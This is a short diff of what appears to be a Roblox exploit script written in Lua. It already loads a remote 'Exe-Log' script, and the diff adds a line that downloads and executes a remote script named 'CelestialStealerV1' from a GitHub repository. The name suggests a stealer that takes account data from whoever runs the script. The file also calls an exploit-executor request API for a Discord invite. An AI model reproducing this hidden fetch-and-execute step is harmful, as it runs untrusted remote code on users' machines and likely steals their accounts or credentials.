@@ -1,6 +1,9 @@
 --// Webhook Message
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Hydrosploit/Celestial/main/Exe-Log"))()
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hydrosploit/Celestial/main/CelestialStealerV1"))()
+
+
 --// Discord Invite
 pcall(function()
     local Request = syn and syn.request or request
